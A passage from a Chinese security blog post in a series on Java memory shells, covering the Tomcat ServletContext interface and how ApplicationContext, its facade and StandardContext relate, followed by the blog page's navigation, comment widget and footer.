+<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletRegistration<span class="token punctuation">.</span>Dynamic</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>descriptor<span class="token punctuation">.</span></span><span class="token class-name">JspConfigDescriptor</span><span class="token punctuation">;</span>
+ 
+ 
+<span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">ServletContext</span> <span class="token punctuation">&#123;</span>
+    <span class="token class-name">String</span> TEMPDIR <span class="token operator">=</span> <span class="token string">"javax.servlet.context.tempdir"</span><span class="token punctuation">;</span>
+ 
+    <span class="token class-name">String</span> <span class="token function">getContextPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token class-name">ServletContext</span> <span class="token function">getContext</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> <span class="token function">getMajorVersion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> <span class="token function">getMinorVersion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> <span class="token function">getEffectiveMajorVersion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> <span class="token function">getEffectiveMinorVersion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token class-name">String</span> <span class="token function">getMimeType</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token class-name">Set</span> <span class="token function">getResourcePaths</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token class-name">URL</span> <span class="token function">getResource</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">MalformedURLException</span><span class="token punctuation">;</span>
+    <span class="token class-name">InputStream</span> <span class="token function">getResourceAsStream</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token class-name">RequestDispatcher</span> <span class="token function">getRequestDispatcher</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token class-name">RequestDispatcher</span> <span class="token function">getNamedDispatcher</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">/** @deprecated */</span>
+    <span class="token class-name">Servlet</span> <span class="token function">getServlet</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">;</span>
+    <span class="token comment">/** @deprecated */</span>
+    <span class="token class-name">Enumeration</span> <span class="token function">getServlets</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">/** @deprecated */</span>
+    <span class="token class-name">Enumeration</span> <span class="token function">getServletNames</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">void</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">/** @deprecated */</span>
+    <span class="token keyword">void</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> var1<span class="token punctuation">,</span> <span class="token class-name">String</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">void</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">,</span> <span class="token class-name">Throwable</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token class-name">String</span> <span class="token function">getRealPath</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token class-name">String</span> <span class="token function">getServerInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token class-name">String</span> <span class="token function">getInitParameter</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token class-name">Enumeration</span> <span class="token function">getInitParameterNames</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">boolean</span> <span class="token function">setInitParameter</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">,</span> <span class="token class-name">String</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token class-name">Object</span> <span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token class-name">Enumeration</span> <span class="token function">getAttributeNames</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+    <span class="token keyword">void</span> <span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">,</span> <span class="token class-name">Object</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+    <span class="token keyword">void</span> <span class="token function">removeAttribute</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+    <span class="token class-name">String</span> <span class="token function">getServletContextName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    
+    <span class="token class-name">Dynamic</span> <span class="token function">addServlet</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">,</span> <span class="token class-name">String</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+    <span class="token class-name">Dynamic</span> <span class="token function">addServlet</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">,</span> <span class="token class-name">Servlet</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+ 
+    <span class="token class-name">Dynamic</span> <span class="token function">addServlet</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">,</span> <span class="token class-name">Class</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+     <span class="token keyword">extends</span> <span class="token class-name">Servlet</span><span class="token operator">></span> <span class="token class-name">T</span> <span class="token function">createServlet</span><span class="token punctuation">(</span><span class="token class-name">Classvar1</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">;</span>
+ 
+    <span class="token class-name">ServletRegistration</span> <span class="token function">getServletRegistration</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+    <span class="token class-name">Map</span> <span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">ServletRegistration</span><span class="token operator">></span> <span class="token function">getServletRegistrations</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+    <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span>FilterRegistration<span class="token punctuation">.</span>Dynamic</span> <span class="token function">addFilter</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">,</span> <span class="token class-name">String</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+    <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span>FilterRegistration<span class="token punctuation">.</span>Dynamic</span> <span class="token function">addFilter</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">,</span> <span class="token class-name">Filter</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+    <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span>FilterRegistration<span class="token punctuation">.</span>Dynamic</span> <span class="token function">addFilter</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">,</span> <span class="token class-name">Class</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+     <span class="token keyword">extends</span> <span class="token class-name">Filter</span><span class="token operator">></span> <span class="token class-name">T</span> <span class="token function">createFilter</span><span class="token punctuation">(</span><span class="token class-name">Classvar1</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">;</span>
+    <span class="token class-name">FilterRegistration</span> <span class="token function">getFilterRegistration</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token class-name">Map</span> <span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">FilterRegistration</span><span class="token operator">></span> <span class="token function">getFilterRegistrations</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token class-name">SessionCookieConfig</span> <span class="token function">getSessionCookieConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">void</span> <span class="token function">setSessionTrackingModes</span><span class="token punctuation">(</span><span class="token class-name">Setvar1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+    <span class="token class-name">Set</span> <span class="token function">getDefaultSessionTrackingModes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+    <span class="token class-name">Set</span> <span class="token function">getEffectiveSessionTrackingModes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+    <span class="token keyword">void</span> <span class="token function">addListener</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token keyword">extends</span> <span class="token class-name">EventListener</span><span class="token operator">></span> <span class="token keyword">void</span> <span class="token function">addListener</span><span class="token punctuation">(</span><span class="token class-name">T</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+    <span class="token keyword">void</span> <span class="token function">addListener</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token keyword">extends</span> <span class="token class-name">EventListener</span><span class="token operator">></span> <span class="token class-name">T</span> <span class="token function">createListener</span><span class="token punctuation">(</span><span class="token class-name">Classvar1</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">;</span>
+    <span class="token class-name">JspConfigDescriptor</span> <span class="token function">getJspConfigDescriptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token class-name">ClassLoader</span> <span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">void</span> <span class="token function">declareRoles</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看到ServletContext接口中定义了很多操作，能对Servlet中的各种资源进行访问、添加、删除等。</p>
+<h3 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h3><p>在Tomcat中，ServletContext规范的实现是ApplicationContext，因为门面模式的原因，实际套了一层ApplicationContextFacade。关于什么是门面模式具体可以看<a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/facade-pattern-3.html">这篇文章</a>，简单来讲就是加一层包装。也可以理解为 AOP 吧</p>
+<p>其中ApplicationContext实现了ServletContext规范定义的一些方法，例如addServlet,addFilter等</p>
+<h3 id="StandardContext"><a href="#StandardContext" class="headerlink" title="StandardContext"></a>StandardContext</h3><p><code>org.apache.catalina.core.StandardContext</code>是子容器<code>Context</code>的标准实现类，其中包含了对Context子容器中资源的各种操作。四种子容器都有其对应的标准实现如下</p>
+<img src="/2022/08/21/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-02-%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%8B%E7%BB%8D/StandardContext.png" class="">
+
+<p>而在ApplicationContext类中，对资源的各种操作实际上是调用了StandardContext中的方法</p>
+<img src="/2022/08/21/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-02-%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%8B%E7%BB%8D/Use.png" class="">
+
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getRequestCharacterEncoding</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> context<span class="token punctuation">.</span><span class="token function">getRequestCharacterEncoding</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="Tomcat-三个-Context-总结"><a href="#Tomcat-三个-Context-总结" class="headerlink" title="Tomcat 三个 Context 总结"></a>Tomcat 三个 Context 总结</h3><p>我们可以用一张图来表示各Context的关系</p>
+<img src="/2022/08/21/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-02-%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%8B%E7%BB%8D/ThreeContext.png" class="">
+
+<p>ServletContext接口的实现类为ApplicationContext类和ApplicationContextFacade类，其中ApplicationContextFacade是对ApplicationContext类的包装。我们对Context容器中各种资源进行操作时，最终调用的还是StandardContext中的方法，因此StandardContext是Tomcat中负责与底层交互的Context。</p>
+<h2 id="0x06-小结"><a href="#0x06-小结" class="headerlink" title="0x06 小结"></a>0x06 小结</h2><ul>
+<li>简单看了看 JSP 与 Tomcat 中三个 Context 的一些东西，感觉还好。</li>
+</ul>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    
+<div class="article-copyright-info-container">
+    <ul class="copyright-info-content">
+        <li class="post-title">
+            <span class="type">本文标题</span>：<span class="content">Java内存马系列-02-内存马介绍</span>
+        </li>
+        <li class="post-author">
+            <span class="type">本文作者</span>：<span class="content">Drunkbaby</span>
+        </li>
+        <li class="post-time">
+            <span class="type">创建时间</span>：<span class="content">2022-08-21 09:40:22</span>
+        </li>
+        <li class="post-link">
+            <span class="type">本文链接</span>：<span class="content">2022/08/21/Java内存马系列-02-内存马介绍/</span>
+        </li>
+        <li class="post-license">
+            <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
+        </li>
+    </ul>
+    <div class="copy-copyright-info flex-center tooltip" data-content="复制版权信息" data-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/Java/">#Java</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                               rel="prev"
+                               href="/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/"
+                            >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                                <span class="title flex-center">
+                                <span class="post-nav-title-item">Java内存马系列-03-Tomcat 之 Filter 型内存马</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2022/08/19/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-01-%E5%9F%BA%E7%A1%80%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Java内存马系列-01-基础内容学习</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+                <div class="comment-container">
+                    
+<div class="comments-container">
+    <div id="comments-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments"></i>&nbsp;评论
+    </div>
+    
+        
+            
+
+    <div class="valine-container">
+        <script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script data-pjax>
+          function loadValine() {
+
+            const config = {
+              el: '#vcomments',
+              appId: 'mCIu9X4iLP3I0GikUoetB9bV-9Nh9j0Va',
+              appKey: 'ermlV1eoB1YODT088EdXjo6C',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: 'just go go',
+              lang: 'zh-CN'.toLowerCase()
+            }
+
+            if ('') {
+              config.serverURLs = ''
+            }
+
+            new Valine(config)
+
+            function getAuthor(language) {
+              switch (language) {
+                case 'en':
+                  return 'Author'
+                case 'zh-CN':
+                  return '博主'
+                default:
+                  return 'Master'
+              }
+            }
+
+            // Add "Author" identify
+            const getValineDomTimer = setInterval(() => {
+              const vcards = document.querySelectorAll('#vcomments .vcards .vcard')
+              if (vcards.length > 0) {
+                let author = 'Drunkbaby'
+
+                if (author) {
+                  for (let vcard of vcards) {
+                    const vnick_dom = vcard.querySelector('.vhead .vnick')
+                    const vnick = vnick_dom.innerHTML
+                    if (vnick === author) {
+                      vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                    }
+                  }
+                }
+                clearInterval(getValineDomTimer)
+              } else {
+                clearInterval(getValineDomTimer)
+              }
+            }, 2000)
+          }
+
+          if ('true' === 'true') {
+            const loadValineTimeout = setTimeout(() => {
+              loadValine()
+              clearTimeout(loadValineTimeout)
+            }, 1000)
+          } else {
+            window.addEventListener('DOMContentLoaded', loadValine)
+          }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Java-%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-02-%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%8B%E7%BB%8D"><span class="nav-text">Java 内存马系列-02-内存马介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E5%8F%B2"><span class="nav-text">0x02 内存马简史</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-JSP-%E5%9F%BA%E7%A1%80"><span class="nav-text">0x03 JSP 基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AFJSP"><span class="nav-text">1. 什么是JSP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-JSP-%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA"><span class="nav-text">2. JSP 环境的搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-JSP%E7%9A%84%E8%AF%AD%E6%B3%95"><span class="nav-text">3. JSP的语法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%E7%A8%8B%E5%BA%8F"><span class="nav-text">脚本程序</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JSP%E5%A3%B0%E6%98%8E"><span class="nav-text">JSP声明</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JSP-%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="nav-text">JSP 表达式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JSP-%E6%8C%87%E4%BB%A4"><span class="nav-text">JSP 指令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JSP-%E6%B3%A8%E9%87%8A"><span class="nav-text">JSP 注释</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-JSP%E5%86%85%E7%BD%AE%E5%AF%B9%E8%B1%A1"><span class="nav-text">4. JSP内置对象</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E4%BC%A0%E7%BB%9F%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-text">0x04 传统内存马</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-Tomcat-%E4%B8%AD%E7%9A%84%E4%B8%89%E4%B8%AA-Context-%E7%9A%84%E7%90%86%E8%A7%A3"><span class="nav-text">0x05 Tomcat 中的三个 Context 的理解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Context"><span class="nav-text">Context</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ServletContext"><span class="nav-text">ServletContext</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ApplicationContext"><span class="nav-text">ApplicationContext</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#StandardContext"><span class="nav-text">StandardContext</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Tomcat-%E4%B8%89%E4%B8%AA-Context-%E6%80%BB%E7%BB%93"><span class="nav-text">Tomcat 三个 Context 总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E5%B0%8F%E7%BB%93"><span class="nav-text">0x06 小结</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2021</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">Drunkbaby</a>
+            
+        </div>
+        
+            <script async data-pjax
+                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                
+                
+                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>
+
+
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
+        
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
+        
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
